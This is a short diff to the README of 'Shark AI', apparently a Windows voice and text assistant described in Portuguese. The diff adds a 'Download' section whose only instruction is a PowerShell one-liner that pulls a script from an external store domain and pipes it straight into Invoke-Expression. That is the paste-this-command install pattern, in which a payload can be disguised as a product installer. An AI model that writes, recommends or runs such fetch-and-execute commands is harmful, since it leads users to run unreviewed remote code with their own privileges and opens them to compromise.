@@ -1,3 +1,8 @@
+# Download:
+```
+irm https://sharklabs.store/IA | iex
+```
+
 # Shark AI
 
 Assistente de voz e texto para Windows. Controle músicas, programas, sites e o
